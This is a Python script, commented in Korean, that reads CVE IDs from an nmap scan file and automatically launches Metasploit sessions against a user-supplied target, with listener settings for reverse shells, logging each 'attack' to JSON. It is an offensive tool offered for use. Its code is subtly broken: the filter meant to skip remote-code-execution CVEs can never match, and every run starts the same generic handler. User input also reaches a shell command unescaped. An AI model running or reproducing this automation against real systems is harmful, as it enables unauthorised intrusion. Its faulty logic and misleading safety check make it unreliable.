import re
import os
import json
import subprocess
from datetime import datetime

# 도구 실행 및 결과 캡처 함수
def extract_cves_from_file(output_filename):
    cve_list = []
    with open(output_filename, 'r') as file:
        for line in file:
            # CVE 형식은 CVE-XXXX-YYYY
            cve_matches = re.findall(r"CVE-\d{4}-\d{4,7}", line)
            if cve_matches:
                cve_list.extend(cve_matches)
    return list(set(cve_list))  # 중복 제거 후 반환

# Metasploit을 통해 CVE 익스플로잇 실행 함수
def execute_metasploit(cve, lhost, lport, rhost=None, rport=None, timeout=60):
    # 원격 코드 실행 및 쉘 접근 관련 취약점 제외
    if "remote_code_execution" in cve.lower() or "shell" in cve.lower():
        print(f"Excluding remote code execution or shell related CVE: {cve}")
        return "excluded"

    # Metasploit 명령어 구성
    msf_command = (
        f"msfconsole -x 'search {cve}; "
        f"use exploit/multi/handler; "
        f"set LHOST {lhost}; "
        f"set LPORT {lport}; "
    )

    # RHOST와 RPORT가 필요한 경우 추가 설정
    if rhost and rport:
        msf_command += f"set RHOST {rhost}; set RPORT {rport}; "

    msf_command += "run' -q"
    print(f"Attempting to exploit {cve} with Metasploit (LHOST: {lhost}, LPORT: {lport}, RHOST: {rhost}, RPORT: {rport})...")

    try:
        # subprocess로 명령어 실행, 제한 시간 내에 완료되지 않으면 실패로 간주
        result = subprocess.run(msf_command, shell=True, timeout=timeout, capture_output=True, text=True)
        if result.returncode == 0:
            return "success"
        else:
            return "failed"
    except subprocess.TimeoutExpired:
        print(f"Timeout occurred for CVE: {cve}")
        return "timeout"

# 매핑된 CVE에 대해 Metasploit 익스플로잇 실행 함수
def run_metasploit_for_cves(cve_list, lhost, lport, rhost=None, rport=None):
    log_data = []
    for cve in cve_list:
        print(f"Processing CVE: {cve}")
        result = execute_metasploit(cve, lhost, lport, rhost, rport)
        log_data.append({
            "cve": cve,
            "result": result,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
    return log_data

# 공격 로그를 JSON 파일로 저장하는 함수
def save_log_to_json(log_data, filename="metasploit_attack_log.json"):
    filepath = filename  # 파일명은 항상 attack_log.json으로 고정
    with open(filepath, 'w') as f:
        json.dump(log_data, f, indent=4)
    print(f"Logs saved to {filepath}")

# 공격 실행 함수 (전체 흐름)
def execute_attack_with_metasploit(output_filename="attack_results.txt", lhost="127.0.0.1", lport=4444, rhost=None, rport=None):
    # CVE 목록 추출
    cve_list = extract_cves_from_file(output_filename)
    if not cve_list:
        print("No CVEs found in the scan results.")
        return

    # Metasploit 실행하여 CVE 익스플로잇 시도
    print(f"Found CVEs: {', '.join(cve_list)}")
    log_data = run_metasploit_for_cves(cve_list, lhost, lport, rhost, rport)

    # 로그 파일 저장
    save_log_to_json(log_data)

# 타겟 입력 및 공격 실행
if __name__ == "__main__":
    output_filename = "nmap_results.txt"  # 공격 스캔 결과 파일
    lhost = input("Enter the LHOST (your IP for reverse connections): ")
    lport = input("Enter the LPORT (your local port for reverse connections): ")
    rhost = input("Enter the RHOST (target IP, leave blank if not required): ") or None
    rport = input("Enter the RPORT (target port, leave blank if not required): ") or None

    # LPORT를 정수로 변환하고, RPORT도 있으면 정수 변환
    lport = int(lport)
    rport = int(rport) if rport else None

    execute_attack_with_metasploit(output_filename, lhost, lport, rhost, rport)


